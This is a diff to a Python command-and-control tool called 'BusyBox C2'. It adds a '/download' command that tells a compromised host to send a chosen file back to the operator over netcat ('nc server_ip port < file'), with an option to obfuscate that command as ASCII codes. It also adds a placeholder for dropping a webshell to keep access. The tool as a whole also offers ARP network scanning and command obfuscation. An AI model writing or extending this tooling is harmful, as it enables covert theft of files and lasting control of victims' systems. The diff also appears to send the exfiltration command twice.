@@ -1,6 +1,9 @@
 from pyfiglet import Figlet
 import socket, select, sys, time
 import subprocess
+import os
+import random
+import threading
 
 def show_banner():
     print(Figlet(font="slant").renderText("BusyBox C2"))
@@ -54,7 +57,6 @@ def cmd_obfuscation_ascii(raw_cmd):
     return payload
 
 def discover_arp_scan():
-
     net_ip = input("Network IP (ex: 192.168.1.0): ")
     range = input("Range (max: 254): ")
 
@@ -62,9 +64,32 @@ def discover_arp_scan():
     print(cmd)
     return cmd
 
+def download_listener(listener_cmd, listening_port):
+    print(f"Listening on {server_ip}:{listening_port}")
+    os.system(listener_cmd)
+
+def download(socket):
+    file_name = input("File to download: ")
+    listening_port = random.randint(1024, 65534)
+    listener_cmd = "nc -lp " + str(listening_port) + " > " + file_name
+
+    # Send command to get the file with a delay to wait sevrer availability
+    cmd = "sleep 0.5; nc " + server_ip + " " + str(listening_port) + " < " + file_name
+    if "obfuscation_ascii" in options:
+        cmd = cmd_obfuscation_ascii(cmd)
+    send_cmd(socket, cmd)
+    t = threading.Thread(target=send_cmd, args=(socket, cmd,))
+    t.start()
+
+    # Launch listener to receive file
+    os.system(listener_cmd)
+
+    return listening_port, t
+
 def main():
     show_banner()
 
+    global server_ip
     server_ip = "127.0.0.1"
     server_port = 4444
 
@@ -86,6 +111,7 @@ def main():
     s.setblocking(False)
 
     prompt = " (busybox-c2)> "
+    global options
     options = []
 
     try:
@@ -110,8 +136,13 @@ def main():
                         if "obfuscation_ascii" in options:
                             cmd = cmd_obfuscation_ascii(cmd)
                         send_cmd(s, cmd)
+                    case '/download':
+                        # use netcat
+                        download(s)
+                    case '/persistence_webshell':
+                        # launch web server and drop pwnyshell
+                        pass
                     case _:
-
                         if "obfuscation_ascii" in options:
                             cmd = cmd_obfuscation_ascii(cmd)
                             print(f"Executed command: {cmd}\n")
